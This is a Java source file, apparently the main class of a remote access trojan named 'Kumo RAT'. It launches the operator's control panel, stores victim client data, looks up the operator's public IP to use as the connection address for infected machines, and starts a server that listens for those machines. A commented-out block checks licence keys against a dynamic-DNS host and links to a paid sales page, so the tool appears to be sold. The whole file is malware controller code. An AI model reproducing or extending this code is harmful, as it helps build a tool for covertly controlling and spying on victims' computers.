package kumo;

import com.sun.javafx.PlatformUtil;
import de.codecentric.centerdevice.javafxsvg.SvgImageLoaderFactory;
import de.codecentric.centerdevice.javafxsvg.dimension.PrimitiveDimensionProvider;
import gui.Styler;
import gui.views.AlertView;
import gui.views.ClientView;
import javafx.application.Application;
import javafx.application.Platform;
import javafx.scene.Scene;
import javafx.scene.image.Image;
import javafx.stage.Stage;
import javafx.stage.StageStyle;
import logger.Level;
import logger.Logger;
import server.KumoSettings;
import server.Server;
import server.data.PseudoBase;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.channels.FileLock;

/**
 * This is the main entry point for Kumo.
 * It first checks with the authentication server, then creates the necessary files,
 * starts up the listening server, then shows the main GUI window.
 */

public class Kumo extends Application {
    private static Stage primaryStage;
    private static int primaryStageHeight = 500;
    private static Server server = new Server();
    public static SystemTray systemTray;
    public static String[] systemArgs;

    public static Stage getPrimaryStage() {
        return primaryStage;
    }

    public static void main(String[] args) {
        systemArgs = args;
        SvgImageLoaderFactory.install(new PrimitiveDimensionProvider());
        if (lockInstance()) {
            launch(args);
        } else {
            System.exit(0);
        }
    }

    /* Ensure only one instance of kumo is running on a system (server, not client). */
    private static boolean lockInstance() {
        try {
            final File file = new File(System.getProperty("user.home") + "/.lock");
            final RandomAccessFile randomAccessFile = new RandomAccessFile(file, "rw");
            final FileLock fileLock = randomAccessFile.getChannel().tryLock();
            if (fileLock != null) {
                Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                    try {
                        fileLock.release();
                        randomAccessFile.close();
                        file.delete();
                        /*Before kumo is closed - write kumo data to file (server settings, clients, etc.) */
                        try {
                            PseudoBase.writeKumoData();
                            Logger.log(Level.INFO, "KumoData saved to file. ");
                        } catch (IOException e) {
                            Logger.log(Level.ERROR, e.toString(), e);
                        }
                    } catch (Exception e) {
                        Logger.log(Level.ERROR, e.toString(), e);
                    }
                }));
                return true;
            }
        } catch (Exception e) {
            Logger.log(Level.ERROR, e.toString(), e);
        }
        return false;
    }

    @Override
    public void start(Stage primaryStage) throws IOException, ClassNotFoundException {
        // Initialize logger
        Logger.initialize(new File(System.getProperty("user.home") + File.separator + File.separator + "kumo-debug.log"));

        Logger.log(Level.INFO, "Kumo version information:");
        Logger.log(Level.INFO, "\tBuild version: " + KumoSettings.VERSION_CODENAME);
        Logger.log(Level.INFO, "\tJava version: " + System.getProperty("java.version"));
        Logger.log(Level.INFO, "\tOS: " + System.getProperty("os.name"));

        kumo.Kumo.primaryStage = primaryStage;

        /*File firstStartUp = new File(System.getProperty("user.home") + File.separator + ".kumoStartup");
        if (firstStartUp.exists()){
            // Not first run, check if key is activated
            try {
                String key = new Scanner(firstStartUp).useDelimiter("\\A").next();
                String st = "";
                try {
                    st = new Scanner(new URL("http://amfox.ddns.net:8001//id-info/" + key).openStream(), "UTF-8").useDelimiter("\\A").next();
                } catch (NoSuchElementException e){
                    new AlertView().showErrorAlertWait("Product key " + key + " does not exist. Please email KumoRAT@protonmail.com for further support.");
                    System.exit(1);
                }
                if (st.equals("{\"exists\":true,\"activated\":true}")){
                    // continue to launch normally
                } else {
                    new AlertView().showErrorAlertWait("Product key " + key + " does not exist. Please email KumoRAT@protonmail.com for further support.");
                    System.exit(1);
                }
            } catch (IOException ioe){
                ioe.printStackTrace();
                new AlertView().showErrorAlertWait("Unable to verify product key. Please check your internet connection.\n" + ioe.getMessage());
                System.exit(1);
            }
        } else {
            // This is the first run, have user enter key and check it with the server
            Stage stage = new Stage();
            stage.setMinHeight(300);
            stage.setMinWidth(300);
            stage.initStyle(StageStyle.DECORATED);
            stage.setScene(new Scene(new FirstRunView().getFirstRunView(stage), 300, 225));
            stage.setOnCloseRequest(a -> System.exit(1)); // If user exits this window, close everything and dont write it
            FirstRunView.getSend().setOnAction(event -> {
                String key = FirstRunView.getTextField().getText().trim();
                try {
                    String st = new Scanner(new URL("http://amfox.ddns.net:8001//check-id/" + key).openStream(), "UTF-8").useDelimiter("\\A").next();
                    if (st.equals("{\"status\":\"false\"}")) {
                        new AlertView().showErrorAlertWait("This software was either pirated or downloaded illegally. Please buy it at https://selly.gg/p/b7e477ee.");
                        System.exit(1);
                    } else if (st.equals("{\"status\":\"true\"}")){
                        System.out.println("Activating key " + key);
                        new URL("http://amfox.ddns.net:8001//activate-id/" + key).openStream().close(); // No return body
                        System.out.println("Key activated");
                        // Write key to file
                        PrintWriter pr = new PrintWriter(firstStartUp);
                        pr.write(key);
                        pr.close();
                        System.out.println("Key written to file");
                    }
                } catch (IOException ioe){
                    ioe.printStackTrace();
                    new AlertView().showErrorAlertWait("\"Unable to verify ID. Please check your internet connection.\"\n" + ioe.getMessage());
                    System.exit(1);
                }
                stage.close();
            });
            stage.showAndWait();
        }
        */
        /* Ensure that the necessary files exist */
        new PseudoBase().createKumoData();
        /* Load data from files - including client data, server settings, etc. */
        new PseudoBase().loadData();
        /* Set up primary view */
        getPrimaryStage().setTitle("Kumo RAT");// + KumoSettings.CURRENT_VERSION);

        if (!PlatformUtil.isMac()){
            // This causes an infinite loop on mac. GUI doesnt start
            SwingUtilities.invokeLater(this::addAppToTray);
        }
        Platform.setImplicitExit(false);
        // Load some required project stuff
        System.setProperty("prism.lcdtext", "false");


        Scene mainScene = new Scene(new ClientView().getClientView(),900, 500);
        mainScene.getStylesheets().add(getClass().getResource(Styler.getCurrentStylesheet()).toExternalForm());
        getPrimaryStage().setScene(mainScene);
        getPrimaryStage().getIcons().add(new Image(getClass().getResourceAsStream("/Images/Icons/icon.png")));
        getPrimaryStage().setOnCloseRequest(event -> System.exit(0));

        /* it is running! */
        Logger.log(Level.INFO, "Kumo is running.");
        getPrimaryStage().initStyle(StageStyle.UNDECORATED);

        try {
            /* Set user's IP as server IP */
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));

            String ip = in.readLine();
            KumoSettings.CONNECTION_IP = ip;
        } catch (UnknownHostException e){
            AlertView a = new AlertView();
            a.showErrorAlert("No internet detected, aborting startup.");
            //System.exit(1);
        }

        getPrimaryStage().show();

        /* Start the server to listen for client connections. */
        Runnable startServer = server;
        new Thread(startServer).start();
    }


    /* Attempt to add xRAT to the System Tray - regardless of persistence (handled in TitleBar) */
    private void addAppToTray() {
        try {
           Toolkit.getDefaultToolkit();

            if (!SystemTray.isSupported()) {
                System.out.println("No system tray support, application exiting.");
                Platform.exit();
            }

            systemTray = SystemTray.getSystemTray();
            java.awt.Image image = ImageIO.read(getClass().getResourceAsStream("/Images/Icons/icon.png"));
            TrayIcon trayIcon = new TrayIcon(image);
            trayIcon.setImageAutoSize(true);
            ActionListener actionListener = event -> Platform.runLater(this::showStage);
            trayIcon.addActionListener(actionListener);

            MenuItem openItem = new MenuItem("Open Kumo");
            openItem.addActionListener(actionListener);

            Font defaultFont = Font.decode(null);
            Font boldFont = defaultFont.deriveFont(java.awt.Font.BOLD);
            openItem.setFont(boldFont);

            MenuItem exitItem = new MenuItem("Exit");
            exitItem.addActionListener(event -> {
                Platform.exit();
                systemTray.remove(trayIcon);
                System.exit(0);
            });
            final PopupMenu popup = new PopupMenu();
            popup.add(openItem);
            popup.addSeparator();
            popup.add(exitItem);
            trayIcon.setPopupMenu(popup);
            systemTray.add(trayIcon);
        } catch (Exception e) {
            Logger.log(Level.ERROR, "Unable to access system tray.");
            e.printStackTrace();
        }
    }

    private void showStage() {
        getPrimaryStage().setScene(new Scene(new ClientView().getClientView(), 900, 500));
        getPrimaryStage().show();
        getPrimaryStage().toFront();
    }
}
